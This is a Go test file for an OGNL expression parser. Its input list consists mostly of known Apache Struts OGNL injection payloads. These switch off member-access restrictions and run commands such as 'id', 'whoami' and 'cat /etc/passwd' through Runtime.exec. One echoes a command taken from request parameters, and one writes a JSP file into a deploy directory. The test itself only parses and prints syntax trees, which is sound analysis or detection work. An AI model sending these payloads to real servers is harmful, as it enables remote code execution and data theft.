package main

import (
	"fmt"
	"testing"

	"github.com/weaweawe01/ParserOgnl/ast"
)

func TestParser(t *testing.T) {

	input := []string{
		"new ognl.test.objects.Simple(new Object[5])",
		"list.{^ #this > 5}",
		"attributes[\"bar\"]",
		" (#runtimeclass = #this.getClass().forName(\"java.lang.Runtime\")).(#getruntimemethod = #runtimeclass.getDeclaredMethods().{^ #this.name.equals(\"getRuntime\")}[0]).(#rtobj = #getruntimemethod.invoke(null,null)).(#execmethod = #runtimeclass.getDeclaredMethods().{? #this.name.equals(\"exec\")}.{? #this.getParameters()[0].getType().getName().equals(\"java.lang.String\")}.{? #this.getParameters().length < 2}[0]).(#execmethod.invoke(#rtobj,\"touch /tmp/ognl\"))",
		"(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(\"ls\").getInputStream(),\"utf-8\")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader(\"X-Cmd-Response\",#a))",
		"(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\").getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()))).(#w.close())",
		"@fe.util.FileUtil@saveFileContext(new java.io.File(\"../server/default/deploy/fe.war/123.jsp\"),new sun.misc.BASE64Decoder().decodeBuffer(\"d2hvYW1p\"))",
		"#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#req=#context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletReq'+'uest'),#resp=#context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletRes'+'ponse'),#resp.setCharacterEncoding('UTF-8'),#resp.getWriter().print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(\"whoami\").getInputStream())),#resp.getWriter().flush(),#resp.getWriter().close()",
		"(#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +\n" +
			"(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) +\n" +
			"(#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +\n" +
			"(#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) +\n" +
			"(#request.map3=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +\n" +
			"(#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) +\n" +
			"(#request.get('map3').put('excludedPackageNames',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +\n" +
			"(#request.get('map3').put('excludedClasses',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +\n" +
			"(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'id'}))",

		"(#r=@java.lang.Runtime@getRuntime()).(#r.exec(\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"))",
		"(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\").getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()))).(#w.close())",
		"true&(b)(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\\43mycmd\\75\\'ipconfig\\'')(d))&(h)(('\\43myret\\75@java.lang.Runtime@getRuntime().exec(\\43mycmd)')(d))&(i)(('\\43mydat\\75new\\40java.io.DataInputStream(\\43myret.getInputStream())')(d))&(j)(('\\43myres\\75new\\40byte[51020]')(d))&(k)(('\\43mydat.readFully(\\43myres)')(d))&(l)(('\\43mystr\\75new\\40java.lang.String(\\43myres)')(d))&(m)(('\\43myout\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('\\43myout.getWriter().println(\\43mystr)')(d))",
		"('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003dfalse')(bla)(bla)&('\\u0023_memberAccess.excludeProperties\\u003d@java.util.Collections@EMPTY_SET')(kxlzx)(kxlzx)&('\\u0023_memberAccess.allowStaticMethodAccess\\u003dtrue')(bla)(bla)&('\\u0023mycmd\\u003d\\'id\\'')(bla)(bla)&('\\u0023myret\\u003d@java.lang.Runtime@getRuntime().exec(\\u0023mycmd)')(bla)(bla)&(A)(('\\u0023mydat\\u003dnew\\40java.io.DataInputStream(\\u0023myret.getInputStream())')(bla))&(B)(('\\u0023myres\\u003dnew\\40byte[51020]')(bla))&(C)(('\\u0023mydat.readFully(\\u0023myres)')(bla))&(D)(('\\u0023mystr\\u003dnew\\40java.lang.String(\\u0023myres)')(bla))&('\\u0023myout\\u003d@org.apache.struts2.ServletActionContext@getResponse()')(bla)(bla)&(E)(('\\u0023myout.getWriter().println(\\u0023mystr)')(bla))",
		"(#_memberAccess[\"allowStaticMethodAccess\"]=true,#foo=new java.lang.Boolean(\"false\") ,#context[\"xwork.MethodAccessor.denyMethodExecution\"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream()))",
		"(#context[\"xwork.MethodAccessor.denyMethodExecution\"]= new java.lang.Boolean(false), #_memberAccess[\"allowStaticMethodAccess\"]=true, #a=@java.lang.Runtime@getRuntime().exec('ls').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[51020],#c.read(#d),#kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#kxlzx.println(#d),#kxlzx.close())(meh)&z[(name)('meh')]",
		"#a=(new java.lang.ProcessBuilder(new java.lang.String[]{\"cat\", \"/etc/passwd\"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()",
		"(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))",
	}

	for _, in := range input {

		// 创建词法分析器和解析器
		l := ast.NewLexer(in)
		p := ast.New(l)
		// 解析表达式
		expr, err := p.ParseTopLevelExpression()
		// 检查错误
		if err != nil {
			fmt.Printf("Parser errors: %v\n", err)
			return
		}
		if len(p.Errors()) > 0 {
			fmt.Println("Parser errors:")
			for _, err := range p.Errors() {
				fmt.Printf("  %s\n", err)
			}
			return
		}
		if expr == nil {
			fmt.Println("Failed to parse expression")
			return
		}
		// 输出详细的AST结构
		fmt.Println("AST 结构:")
		ast.PrintASTStructure(expr, 0)
	}
}
